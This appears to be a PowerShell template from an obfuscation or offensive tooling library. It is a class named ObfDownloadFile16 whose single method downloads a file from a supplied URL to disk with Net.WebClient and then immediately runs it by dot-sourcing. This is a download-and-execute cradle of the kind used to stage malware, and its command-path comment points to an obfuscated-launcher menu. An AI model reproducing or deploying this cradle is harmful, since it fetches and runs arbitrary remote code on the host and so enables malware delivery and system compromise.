Class ObfDownloadFile16 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\11
        (New-Object Net.WebClient).DownloadFile($url,$path);. $path
    }

}